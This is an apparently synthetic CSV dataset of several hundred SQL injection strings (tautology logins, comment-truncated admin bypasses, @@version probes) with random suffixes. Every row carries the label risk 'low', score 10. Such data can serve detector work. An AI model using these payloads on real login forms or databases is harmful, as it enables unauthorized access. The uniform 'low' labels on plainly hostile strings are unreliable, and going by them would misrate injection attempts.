query,risk,score
1' OR '1'='1 # gcaq7eu,low,10
""" OR ""1""=""1 # 3m87p07",low,10
' OR 1=1 -- AND 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- /**/ # 3e,low,10
admin' -- -- j8ixml,low,10
1' or 1=1 -- AND 1=1 -- ,low,10
1' or true -- # uap434l,low,10
' OR 'x'='x # lr8m7j9,low,10
1' or '1'='1 /**/ /**/,low,10
admin' /**/ /**/ /**/,low,10
' OR 'a'='a -- e46gt5,low,10
' OR 1=1 -- /**/ /**/,low,10
' or 'a'='a # 0bo38ru,low,10
' OR 'x'='x AND 1=1 -- ,low,10
' || 1=1 -- LIMIT 1 -- ,low,10
1' OR '1'='1 -- owqz57,low,10
' OR 1=1 LIMIT 1 -- /**/ -- z,low,10
1' or true -- # kdf50iy,low,10
""" OR ""1""=""1 -- 8ynkj0",low,10
1' or 1=1 -- AND 1=1 -- ,low,10
admin' /**/ -- dyqb7n,low,10
' OR 'a'='a -- 3lgjyb,low,10
' OR 1=1 -- LIMIT 1 -- ,low,10
admin' -- AND 1=1 -- ,low,10
admin' /**/ AND 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- AND 1=1 -- ,low,10
' OR 'x'='x AND 1=1 -- ,low,10
admin' -- OR 1=1 # ,low,10
1' or true -- AND 1=1 -- ,low,10
' OR 1=1 -- -- 81bvm0,low,10
admin' -- # wrob1f8,low,10
' OR 1=1 LIMIT 1 -- # 4f0rh81,low,10
admin' -- # rt8yyh1,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 # ,low,10
' or 'a'='a /**/ -- o,low,10
admin' -- -- tfe3hw,low,10
""" OR ""1""=""1 AND 1=1 -- ",low,10
' || 1=1 -- OR 1=1 # ,low,10
' or 'a'='a OR 1=1 # ,low,10
admin' -- -- 4pbqse,low,10
' OR 1=1 -- /**/ # hy,low,10
1' or 1=1 -- -- regkz1,low,10
1' or '1'='1 -- 4phj49,low,10
' OR 'x'='x /**/ /**/,low,10
' OR 1=1 LIMIT 1 -- # blntl4d,low,10
' OR 1=1 -- LIMIT 1 -- ,low,10
1' or true -- LIMIT 1 -- ,low,10
""" OR ""1""=""1 AND 1=1 -- ",low,10
1' or true -- OR 1=1 # ,low,10
' OR 1=1 LIMIT 1 -- AND 1=1 -- ,low,10
' OR 1=1 -- LIMIT 1 -- ,low,10
1' or true -- /**/ /**/,low,10
admin' -- -- o1z0yy,low,10
1' OR '1'='1 OR 1=1 # ,low,10
' OR 1=1 LIMIT 1 -- -- 1ndky5,low,10
' or 'a'='a LIMIT 1 -- ,low,10
1' or '1'='1 OR 1=1 # ,low,10
' or 'a'='a -- gegnh1,low,10
' OR 1 IN (SELECT @@version) -- # kfugask,low,10
1' or 1=1 -- -- aa2i48,low,10
1' or '1'='1 -- rhywft,low,10
' || 1=1 -- /**/ -- w,low,10
' OR 1=1 LIMIT 1 -- /**/ /**/,low,10
1' or '1'='1 # obevum6,low,10
1' OR '1'='1 -- 06e5bk,low,10
' OR 1=1 LIMIT 1 -- -- veds9s,low,10
admin' /**/ OR 1=1 # ,low,10
' or 'a'='a OR 1=1 # ,low,10
1' or 1=1 -- AND 1=1 -- ,low,10
admin' -- OR 1=1 # ,low,10
' OR 1 IN (SELECT @@version) -- /**/ # ev,low,10
""" OR ""1""=""1 LIMIT 1 -- ",low,10
' OR 'x'='x OR 1=1 # ,low,10
admin' /**/ /**/ /**/,low,10
admin' -- -- 6rlpe1,low,10
1' or 1=1 -- AND 1=1 -- ,low,10
' OR 'a'='a /**/ # zx,low,10
' OR 'x'='x # ubayvdt,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 # ,low,10
' OR 'a'='a AND 1=1 -- ,low,10
admin' /**/ LIMIT 1 -- ,low,10
' or 'a'='a LIMIT 1 -- ,low,10
' or 'a'='a LIMIT 1 -- ,low,10
' or 'a'='a /**/ /**/,low,10
admin' /**/ LIMIT 1 -- ,low,10
admin' /**/ -- rr22sr,low,10
admin' -- LIMIT 1 -- ,low,10
admin' /**/ -- emlsi0,low,10
1' or true -- AND 1=1 -- ,low,10
""" OR ""1""=""1 AND 1=1 -- ",low,10
admin' -- LIMIT 1 -- ,low,10
1' or true -- AND 1=1 -- ,low,10
""" OR ""1""=""1 AND 1=1 -- ",low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 # ,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1 -- ,low,10
admin' -- -- rxc354,low,10
1' or 1=1 -- # ftfzr4t,low,10
' || 1=1 -- LIMIT 1 -- ,low,10
1' or true -- OR 1=1 # ,low,10
' OR 1=1 LIMIT 1 -- AND 1=1 -- ,low,10
admin' -- # 1g7i47v,low,10
""" OR ""1""=""1 # ouf2mns",low,10
' OR 'a'='a AND 1=1 -- ,low,10
' OR 1=1 -- LIMIT 1 -- ,low,10
admin' -- OR 1=1 # ,low,10
' OR 1=1 LIMIT 1 -- /**/ # q2,low,10
1' OR '1'='1 -- haweb5,low,10
admin' /**/ # chw3uz6,low,10
' OR 1=1 -- LIMIT 1 -- ,low,10
""" OR ""1""=""1 -- jtaz8j",low,10
' OR 1=1 LIMIT 1 -- /**/ -- b,low,10
' OR 'a'='a -- z923qs,low,10
1' or true -- -- qluqe4,low,10
' OR 'x'='x # 0i8fqnd,low,10
' or 'a'='a -- ceh7q3,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 # ,low,10
' OR 1=1 -- OR 1=1 # ,low,10
1' or '1'='1 LIMIT 1 -- ,low,10
1' or '1'='1 AND 1=1 -- ,low,10
' || 1=1 -- -- l0u73v,low,10
' || 1=1 -- OR 1=1 # ,low,10
' or 'a'='a # w2639xk,low,10
""" OR ""1""=""1 OR 1=1 # ",low,10
' OR 1=1 -- OR 1=1 # ,low,10
1' or true -- AND 1=1 -- ,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1 -- ,low,10
' OR 'a'='a /**/ /**/,low,10
admin' /**/ /**/ /**/,low,10
' OR 1=1 -- LIMIT 1 -- ,low,10
1' or '1'='1 # nh76vrc,low,10
""" OR ""1""=""1 # yqt12fh",low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 # ,low,10
1' or true -- OR 1=1 # ,low,10
' OR 'a'='a OR 1=1 # ,low,10
' OR 1 IN (SELECT @@version) -- AND 1=1 -- ,low,10
' OR 'x'='x -- wypw4r,low,10
1' OR '1'='1 LIMIT 1 -- ,low,10
' OR 1=1 LIMIT 1 -- AND 1=1 -- ,low,10
' OR 'a'='a -- g5bz7i,low,10
' || 1=1 -- # 9yom52p,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 # ,low,10
' OR 1=1 -- # bplb0zf,low,10
admin' -- AND 1=1 -- ,low,10
1' or '1'='1 -- zd3jac,low,10
admin' /**/ /**/ # vx,low,10
admin' -- /**/ -- u,low,10
admin' -- LIMIT 1 -- ,low,10
1' or 1=1 -- /**/ -- 6,low,10
1' or true -- # w03aahu,low,10
1' or '1'='1 OR 1=1 # ,low,10
1' or 1=1 -- OR 1=1 # ,low,10
1' OR '1'='1 OR 1=1 # ,low,10
' || 1=1 -- OR 1=1 # ,low,10
' OR 1=1 -- /**/ /**/,low,10
1' or true -- -- l8tiq9,low,10
' OR 1=1 -- LIMIT 1 -- ,low,10
admin' /**/ /**/ # 8i,low,10
' OR 'a'='a # b4o19rm,low,10
' or 'a'='a # xvil3yk,low,10
' OR 1 IN (SELECT @@version) -- -- idiqtk,low,10
' || 1=1 -- AND 1=1 -- ,low,10
1' or '1'='1 /**/ # 3w,low,10
' or 'a'='a -- 3vii88,low,10
admin' -- /**/ -- 3,low,10
1' or '1'='1 LIMIT 1 -- ,low,10
admin' -- /**/ /**/,low,10
' or 'a'='a LIMIT 1 -- ,low,10
' OR 1=1 -- OR 1=1 # ,low,10
' OR 'a'='a -- 5s3119,low,10
1' OR '1'='1 AND 1=1 -- ,low,10
1' OR '1'='1 OR 1=1 # ,low,10
' OR 'a'='a # d1vih8e,low,10
' OR 'a'='a LIMIT 1 -- ,low,10
' or 'a'='a -- 580dtg,low,10
admin' /**/ -- 5760wa,low,10
admin' -- AND 1=1 -- ,low,10
' OR 'x'='x LIMIT 1 -- ,low,10
' OR 'x'='x /**/ # 5u,low,10
' OR 1=1 LIMIT 1 -- OR 1=1 # ,low,10
admin' /**/ AND 1=1 -- ,low,10
' OR 'a'='a OR 1=1 # ,low,10
admin' -- # t1tctsz,low,10
' || 1=1 -- AND 1=1 -- ,low,10
' or 'a'='a OR 1=1 # ,low,10
1' or true -- # skbj1zi,low,10
admin' -- LIMIT 1 -- ,low,10
1' or 1=1 -- /**/ -- 4,low,10
1' or true -- AND 1=1 -- ,low,10
1' or '1'='1 # tz49veb,low,10
admin' -- /**/ /**/,low,10
1' or 1=1 -- # 84mibpf,low,10
""" OR ""1""=""1 AND 1=1 -- ",low,10
admin' -- # gucwfgv,low,10
admin' -- # un8nzw4,low,10
1' or 1=1 -- -- 1i3tln,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 # ,low,10
1' or true -- AND 1=1 -- ,low,10
admin' -- AND 1=1 -- ,low,10
' OR 'a'='a AND 1=1 -- ,low,10
1' or 1=1 -- AND 1=1 -- ,low,10
admin' -- AND 1=1 -- ,low,10
' OR 'x'='x /**/ /**/,low,10
' || 1=1 -- -- oj0a1w,low,10
admin' -- /**/ # eh,low,10
admin' -- /**/ # 03,low,10
' or 'a'='a -- andaa3,low,10
1' or 1=1 -- AND 1=1 -- ,low,10
1' or true -- AND 1=1 -- ,low,10
1' or '1'='1 LIMIT 1 -- ,low,10
1' or 1=1 -- /**/ -- t,low,10
' OR 'a'='a LIMIT 1 -- ,low,10
' OR 1=1 -- OR 1=1 # ,low,10
' or 'a'='a AND 1=1 -- ,low,10
1' or 1=1 -- AND 1=1 -- ,low,10
1' or '1'='1 -- a0epjf,low,10
' OR 'a'='a -- 4yynsy,low,10
' OR 1=1 -- OR 1=1 # ,low,10
1' OR '1'='1 /**/ # o9,low,10
' OR 1=1 -- OR 1=1 # ,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 # ,low,10
' or 'a'='a AND 1=1 -- ,low,10
admin' -- # ekwke20,low,10
1' or true -- -- xoz8nv,low,10
' OR 'x'='x AND 1=1 -- ,low,10
' OR 'a'='a # 3bk9d60,low,10
' OR 1=1 -- OR 1=1 # ,low,10
1' or true -- OR 1=1 # ,low,10
1' or true -- -- b0aoqm,low,10
1' or true -- # gaktmbt,low,10
' OR 'a'='a OR 1=1 # ,low,10
' OR 'x'='x # ix7hnmv,low,10
' OR 1=1 LIMIT 1 -- /**/ -- b,low,10
admin' -- # hya4488,low,10
' OR 1=1 -- LIMIT 1 -- ,low,10
admin' /**/ -- 4ff58v,low,10
admin' -- OR 1=1 # ,low,10
admin' /**/ # h8qr379,low,10
admin' -- # sdwqet9,low,10
' || 1=1 -- LIMIT 1 -- ,low,10
1' or true -- AND 1=1 -- ,low,10
' || 1=1 -- OR 1=1 # ,low,10
' OR 1 IN (SELECT @@version) -- LIMIT 1 -- ,low,10
' or 'a'='a AND 1=1 -- ,low,10
admin' -- -- r090wb,low,10
' or 'a'='a AND 1=1 -- ,low,10
' OR 'a'='a /**/ /**/,low,10
admin' /**/ AND 1=1 -- ,low,10
' or 'a'='a /**/ /**/,low,10
1' or '1'='1 OR 1=1 # ,low,10
admin' -- -- v2a5og,low,10
1' or 1=1 -- -- i0hv9v,low,10
1' or true -- OR 1=1 # ,low,10
1' OR '1'='1 AND 1=1 -- ,low,10
1' or true -- # seys2zr,low,10
1' OR '1'='1 # rx6pa6i,low,10
1' or 1=1 -- OR 1=1 # ,low,10
1' or 1=1 -- AND 1=1 -- ,low,10
1' or 1=1 -- LIMIT 1 -- ,low,10
admin' -- AND 1=1 -- ,low,10
""" OR ""1""=""1 -- qh9330",low,10
1' or '1'='1 /**/ # f9,low,10
1' or '1'='1 OR 1=1 # ,low,10
admin' /**/ -- 7jjfmy,low,10
' OR 1 IN (SELECT @@version) -- -- cq6uk4,low,10
' OR 'x'='x OR 1=1 # ,low,10
' OR 1=1 LIMIT 1 -- /**/ /**/,low,10
' OR 1 IN (SELECT @@version) -- /**/ -- w,low,10
admin' /**/ OR 1=1 # ,low,10
1' OR '1'='1 AND 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- OR 1=1 # ,low,10
admin' /**/ LIMIT 1 -- ,low,10
' OR 'x'='x LIMIT 1 -- ,low,10
admin' -- OR 1=1 # ,low,10
1' OR '1'='1 -- s6su4n,low,10
' OR 'a'='a # el77neo,low,10
' OR 'x'='x -- drm6dn,low,10
' OR 'a'='a LIMIT 1 -- ,low,10
' OR 1=1 -- AND 1=1 -- ,low,10
1' OR '1'='1 OR 1=1 # ,low,10
1' or '1'='1 LIMIT 1 -- ,low,10
admin' -- OR 1=1 # ,low,10
' OR 'x'='x OR 1=1 # ,low,10
""" OR ""1""=""1 OR 1=1 # ",low,10
admin' -- /**/ # 0g,low,10
1' or '1'='1 # 3xe271x,low,10
' OR 1=1 LIMIT 1 -- OR 1=1 # ,low,10
admin' /**/ -- 7ml5d8,low,10
' OR 1=1 LIMIT 1 -- AND 1=1 -- ,low,10
' OR 1=1 -- /**/ -- n,low,10
' OR 'x'='x # pn2ylzg,low,10
' || 1=1 -- -- jo2kiy,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 # ,low,10
admin' -- /**/ -- c,low,10
admin' -- # 94dfz5o,low,10
1' or '1'='1 -- 30zkpx,low,10
admin' /**/ # 98fdzmn,low,10
1' OR '1'='1 LIMIT 1 -- ,low,10
1' or true -- # k9a30kd,low,10
' OR 'a'='a OR 1=1 # ,low,10
' OR 'a'='a OR 1=1 # ,low,10
admin' -- AND 1=1 -- ,low,10
admin' -- -- ees38h,low,10
' || 1=1 -- AND 1=1 -- ,low,10
' or 'a'='a AND 1=1 -- ,low,10
1' or 1=1 -- LIMIT 1 -- ,low,10
1' OR '1'='1 -- ryyhwt,low,10
' OR 'a'='a /**/ -- h,low,10
1' or '1'='1 OR 1=1 # ,low,10
admin' -- # 0pjhkbj,low,10
' || 1=1 -- # 4h2gn82,low,10
' OR 'x'='x /**/ -- d,low,10
' || 1=1 -- OR 1=1 # ,low,10
' || 1=1 -- /**/ /**/,low,10
' || 1=1 -- # p8l8f1x,low,10
""" OR ""1""=""1 OR 1=1 # ",low,10
1' or 1=1 -- # nw99xuj,low,10
' OR 'x'='x OR 1=1 # ,low,10
admin' -- /**/ # hi,low,10
""" OR ""1""=""1 /**/ /**/",low,10
1' OR '1'='1 -- zbrnpy,low,10
1' OR '1'='1 # 4qnrenx,low,10
' || 1=1 -- AND 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- # 9mmf37v,low,10
admin' -- # qlu4rt1,low,10
' OR 1 IN (SELECT @@version) -- # cy3xuwl,low,10
1' or true -- AND 1=1 -- ,low,10
' || 1=1 -- # kwom11m,low,10
""" OR ""1""=""1 AND 1=1 -- ",low,10
1' or true -- OR 1=1 # ,low,10
admin' -- AND 1=1 -- ,low,10
admin' -- OR 1=1 # ,low,10
' || 1=1 -- AND 1=1 -- ,low,10
' or 'a'='a -- su1fxw,low,10
' or 'a'='a /**/ /**/,low,10
admin' -- AND 1=1 -- ,low,10
1' OR '1'='1 OR 1=1 # ,low,10
1' or '1'='1 # v5zpvwd,low,10
' or 'a'='a # cibpj8t,low,10
' or 'a'='a /**/ # 8q,low,10
""" OR ""1""=""1 AND 1=1 -- ",low,10
admin' /**/ /**/ # o2,low,10
' OR 'a'='a /**/ /**/,low,10
""" OR ""1""=""1 AND 1=1 -- ",low,10
' OR 'x'='x OR 1=1 # ,low,10
' OR 1=1 -- OR 1=1 # ,low,10
' OR 1 IN (SELECT @@version) -- -- a511st,low,10
' OR 1=1 -- AND 1=1 -- ,low,10
' OR 1=1 -- -- bm11ma,low,10
1' or '1'='1 /**/ # h8,low,10
' OR 1=1 LIMIT 1 -- -- b8tf72,low,10
1' or '1'='1 OR 1=1 # ,low,10
""" OR ""1""=""1 /**/ /**/",low,10
admin' -- # 2c1nwt1,low,10
' || 1=1 -- LIMIT 1 -- ,low,10
' or 'a'='a /**/ # kw,low,10
admin' /**/ /**/ # 7h,low,10
1' or '1'='1 OR 1=1 # ,low,10
' OR 1=1 -- LIMIT 1 -- ,low,10
1' OR '1'='1 -- 6wml9j,low,10
1' or true -- /**/ -- g,low,10
' || 1=1 -- LIMIT 1 -- ,low,10
' || 1=1 -- /**/ -- a,low,10
1' or true -- AND 1=1 -- ,low,10
1' or '1'='1 # e8mh0xj,low,10
' OR 'x'='x /**/ # 5x,low,10
1' OR '1'='1 AND 1=1 -- ,low,10
admin' -- AND 1=1 -- ,low,10
1' OR '1'='1 # lplb7hy,low,10
1' or 1=1 -- # wjqwspw,low,10
admin' -- -- 8txm0c,low,10
admin' -- OR 1=1 # ,low,10
' or 'a'='a /**/ # 17,low,10
' OR 1=1 -- /**/ -- l,low,10
1' or '1'='1 # ge0exz8,low,10
' OR 1=1 -- # t0z2wxs,low,10
admin' /**/ -- 3jg7k8,low,10
admin' /**/ OR 1=1 # ,low,10
1' or 1=1 -- AND 1=1 -- ,low,10
' OR 'a'='a LIMIT 1 -- ,low,10
1' or 1=1 -- OR 1=1 # ,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1 -- ,low,10
' OR 1=1 -- -- tudy07,low,10
1' or '1'='1 /**/ /**/,low,10
' or 'a'='a OR 1=1 # ,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1 -- ,low,10
' || 1=1 -- # 22g27p6,low,10
admin' /**/ AND 1=1 -- ,low,10
admin' -- OR 1=1 # ,low,10
1' or 1=1 -- /**/ # 8b,low,10
' OR 'x'='x AND 1=1 -- ,low,10
admin' /**/ AND 1=1 -- ,low,10
1' or true -- OR 1=1 # ,low,10
' || 1=1 -- /**/ /**/,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1 -- ,low,10
admin' -- AND 1=1 -- ,low,10
1' OR '1'='1 OR 1=1 # ,low,10
admin' -- -- 56wrok,low,10
' OR 'a'='a -- hft63d,low,10
""" OR ""1""=""1 LIMIT 1 -- ",low,10
' || 1=1 -- -- k0vh59,low,10
' or 'a'='a /**/ /**/,low,10
' OR 1 IN (SELECT @@version) -- LIMIT 1 -- ,low,10
' OR 1=1 LIMIT 1 -- OR 1=1 # ,low,10
' or 'a'='a AND 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- OR 1=1 # ,low,10
' or 'a'='a # 3qhoa8f,low,10
admin' /**/ OR 1=1 # ,low,10
""" OR ""1""=""1 # vfn16h5",low,10
' OR 1=1 LIMIT 1 -- AND 1=1 -- ,low,10
1' or 1=1 -- LIMIT 1 -- ,low,10
' OR 1=1 LIMIT 1 -- -- gvk01e,low,10
' || 1=1 -- OR 1=1 # ,low,10
' OR 1 IN (SELECT @@version) -- /**/ # gf,low,10
' || 1=1 -- LIMIT 1 -- ,low,10
1' or true -- /**/ -- s,low,10
admin' -- # mjugreo,low,10
' OR 'a'='a /**/ -- g,low,10
' || 1=1 -- LIMIT 1 -- ,low,10
1' or '1'='1 LIMIT 1 -- ,low,10
' or 'a'='a /**/ /**/,low,10
' OR 'x'='x -- h2qupc,low,10
' OR 1=1 -- LIMIT 1 -- ,low,10
admin' /**/ -- ni7m4j,low,10
' OR 1=1 -- OR 1=1 # ,low,10
1' or 1=1 -- OR 1=1 # ,low,10
admin' /**/ LIMIT 1 -- ,low,10
' OR 1=1 LIMIT 1 -- -- 2vll1g,low,10
' or 'a'='a OR 1=1 # ,low,10
' || 1=1 -- # 5cpc66l,low,10
' || 1=1 -- LIMIT 1 -- ,low,10
' OR 1 IN (SELECT @@version) -- /**/ # 56,low,10
1' or true -- /**/ # jv,low,10
1' or '1'='1 OR 1=1 # ,low,10
' || 1=1 -- AND 1=1 -- ,low,10
' || 1=1 -- OR 1=1 # ,low,10
' OR 'x'='x LIMIT 1 -- ,low,10
1' OR '1'='1 /**/ # 0w,low,10
1' OR '1'='1 AND 1=1 -- ,low,10
admin' /**/ # j1nt02h,low,10
1' OR '1'='1 -- hetrtw,low,10
' OR 1=1 -- LIMIT 1 -- ,low,10
admin' -- LIMIT 1 -- ,low,10
' OR 'a'='a /**/ # kr,low,10
""" OR ""1""=""1 AND 1=1 -- ",low,10
' OR 'x'='x AND 1=1 -- ,low,10
""" OR ""1""=""1 LIMIT 1 -- ",low,10
admin' /**/ # 8nlwdbg,low,10
' OR 'x'='x /**/ # 28,low,10
' OR 1=1 LIMIT 1 -- /**/ -- e,low,10
' OR 1 IN (SELECT @@version) -- LIMIT 1 -- ,low,10
admin' /**/ # w4fj1f0,low,10
' OR 1=1 LIMIT 1 -- /**/ /**/,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1 -- ,low,10
1' OR '1'='1 /**/ # re,low,10
1' or 1=1 -- LIMIT 1 -- ,low,10
' or 'a'='a /**/ /**/,low,10
admin' -- LIMIT 1 -- ,low,10
admin' -- -- 4jk14g,low,10
' OR 'a'='a /**/ # 90,low,10
""" OR ""1""=""1 LIMIT 1 -- ",low,10
' OR 1=1 -- LIMIT 1 -- ,low,10
' OR 1 IN (SELECT @@version) -- /**/ /**/,low,10
admin' /**/ -- rch9wz,low,10
1' or 1=1 -- -- pjq0tz,low,10
admin' /**/ AND 1=1 -- ,low,10
1' or true -- AND 1=1 -- ,low,10
admin' -- LIMIT 1 -- ,low,10
""" OR ""1""=""1 LIMIT 1 -- ",low,10
1' or 1=1 -- AND 1=1 -- ,low,10
admin' -- -- 71aoyo,low,10
1' or '1'='1 -- 7nh18u,low,10
' OR 'a'='a LIMIT 1 -- ,low,10
1' or '1'='1 LIMIT 1 -- ,low,10
1' OR '1'='1 OR 1=1 # ,low,10
' OR 1 IN (SELECT @@version) -- -- 72tfmp,low,10
' || 1=1 -- # b4uk4dp,low,10
' OR 1 IN (SELECT @@version) -- # iqxfa2l,low,10
' OR 'a'='a AND 1=1 -- ,low,10
' || 1=1 -- AND 1=1 -- ,low,10
' OR 'a'='a LIMIT 1 -- ,low,10
' or 'a'='a # 10qrooz,low,10
admin' /**/ -- n1ol71,low,10
' OR 'x'='x /**/ -- q,low,10
1' or true -- -- 9g7r1k,low,10
' OR 'a'='a -- pluc4y,low,10
' || 1=1 -- -- ekhsyw,low,10
""" OR ""1""=""1 # 3y57obg",low,10
' OR 'x'='x OR 1=1 # ,low,10
admin' -- OR 1=1 # ,low,10
' || 1=1 -- # xxtm9ud,low,10
' OR 'a'='a LIMIT 1 -- ,low,10
' OR 'x'='x AND 1=1 -- ,low,10
' || 1=1 -- # 2u8z3qp,low,10
admin' /**/ -- r72giv,low,10
1' or 1=1 -- /**/ /**/,low,10
1' or '1'='1 OR 1=1 # ,low,10
1' or true -- /**/ # ml,low,10
' or 'a'='a AND 1=1 -- ,low,10
' || 1=1 -- /**/ /**/,low,10
1' or true -- # ag9pp6o,low,10
' OR 1 IN (SELECT @@version) -- LIMIT 1 -- ,low,10
' OR 'x'='x /**/ -- f,low,10
' OR 'x'='x # ak30pdq,low,10
' OR 'x'='x -- wh366s,low,10
' || 1=1 -- AND 1=1 -- ,low,10
admin' -- AND 1=1 -- ,low,10
admin' -- LIMIT 1 -- ,low,10
' OR 1 IN (SELECT @@version) -- LIMIT 1 -- ,low,10
' OR 1=1 -- LIMIT 1 -- ,low,10
admin' /**/ # f8jwh2v,low,10
' or 'a'='a -- 46ohyz,low,10
' or 'a'='a # tjq8ut8,low,10
1' or true -- /**/ -- a,low,10
' OR 'a'='a LIMIT 1 -- ,low,10
' OR 'x'='x -- mleh9n,low,10
' OR 'x'='x # 53xq9cx,low,10
""" OR ""1""=""1 OR 1=1 # ",low,10
' or 'a'='a LIMIT 1 -- ,low,10
1' OR '1'='1 /**/ /**/,low,10
admin' -- # 5mjdt3l,low,10
admin' -- LIMIT 1 -- ,low,10
' OR 'x'='x LIMIT 1 -- ,low,10
' OR 'x'='x /**/ # k2,low,10
' || 1=1 -- -- pj7ol0,low,10
admin' -- /**/ # kz,low,10
1' or '1'='1 AND 1=1 -- ,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1 -- ,low,10
""" OR ""1""=""1 OR 1=1 # ",low,10
1' or 1=1 -- /**/ # so,low,10
admin' /**/ -- fv36ko,low,10
admin' -- # 3vbb506,low,10
1' or '1'='1 LIMIT 1 -- ,low,10
' OR 'a'='a AND 1=1 -- ,low,10
1' or true -- LIMIT 1 -- ,low,10
admin' /**/ AND 1=1 -- ,low,10
1' or '1'='1 /**/ -- k,low,10
' || 1=1 -- # g496jtk,low,10
admin' -- /**/ /**/,low,10
admin' -- LIMIT 1 -- ,low,10
""" OR ""1""=""1 OR 1=1 # ",low,10
' OR 1 IN (SELECT @@version) -- /**/ /**/,low,10
' OR 'a'='a -- sl6fel,low,10
1' or '1'='1 # 4yc42j7,low,10
admin' -- AND 1=1 -- ,low,10
' || 1=1 -- AND 1=1 -- ,low,10
' OR 1=1 -- /**/ /**/,low,10
1' OR '1'='1 /**/ /**/,low,10
' OR 1=1 LIMIT 1 -- LIMIT 1 -- ,low,10
' or 'a'='a /**/ -- 0,low,10
' OR 'x'='x /**/ /**/,low,10
""" OR ""1""=""1 -- 6m7gu4",low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 # ,low,10
1' OR '1'='1 /**/ /**/,low,10
1' OR '1'='1 -- hjmw5w,low,10
' OR 'x'='x LIMIT 1 -- ,low,10
admin' -- /**/ # dg,low,10
' OR 1=1 -- AND 1=1 -- ,low,10
' OR 'x'='x LIMIT 1 -- ,low,10
""" OR ""1""=""1 /**/ -- 2",low,10
' OR 'x'='x -- besmm1,low,10
' or 'a'='a # nbg1na4,low,10
' OR 1 IN (SELECT @@version) -- # h3h91ow,low,10
admin' -- /**/ # xc,low,10
1' or 1=1 -- AND 1=1 -- ,low,10
admin' -- OR 1=1 # ,low,10
' OR 1 IN (SELECT @@version) -- # 3t11mus,low,10
' OR 1=1 LIMIT 1 -- OR 1=1 # ,low,10
' or 'a'='a # 2iruymn,low,10
1' or true -- # uvs8z2m,low,10
admin' /**/ -- nqvye8,low,10
' || 1=1 -- LIMIT 1 -- ,low,10
' OR 1=1 -- AND 1=1 -- ,low,10
1' or true -- AND 1=1 -- ,low,10
1' OR '1'='1 OR 1=1 # ,low,10
' OR 'x'='x /**/ -- 5,low,10
' OR 'a'='a AND 1=1 -- ,low,10
admin' -- # r1oght6,low,10
1' or 1=1 -- # 5e8ztrb,low,10
1' or true -- OR 1=1 # ,low,10
""" OR ""1""=""1 AND 1=1 -- ",low,10
' OR 'a'='a LIMIT 1 -- ,low,10
' OR 1=1 -- AND 1=1 -- ,low,10
admin' /**/ # zz4t6dh,low,10
' OR 'x'='x AND 1=1 -- ,low,10
' OR 1=1 -- LIMIT 1 -- ,low,10
' OR 1=1 -- # cet0fk6,low,10
' OR 'x'='x /**/ /**/,low,10
' OR 1 IN (SELECT @@version) -- OR 1=1 # ,low,10
' OR 'a'='a /**/ # ut,low,10
admin' -- LIMIT 1 -- ,low,10
' OR 1=1 LIMIT 1 -- AND 1=1 -- ,low,10
admin' -- LIMIT 1 -- ,low,10
1' OR '1'='1 AND 1=1 -- ,low,10
admin' -- # 5jfe2sp,low,10
admin' /**/ AND 1=1 -- ,low,10
1' or '1'='1 AND 1=1 -- ,low,10
1' OR '1'='1 # ah1aweb,low,10
1' or '1'='1 -- ntt6m5,low,10
1' OR '1'='1 LIMIT 1 -- ,low,10
1' or true -- -- f1n10h,low,10
1' or 1=1 -- -- qr70hb,low,10
' OR 'a'='a AND 1=1 -- ,low,10
1' or '1'='1 LIMIT 1 -- ,low,10
1' OR '1'='1 # fqon6h7,low,10
' OR 1=1 -- AND 1=1 -- ,low,10
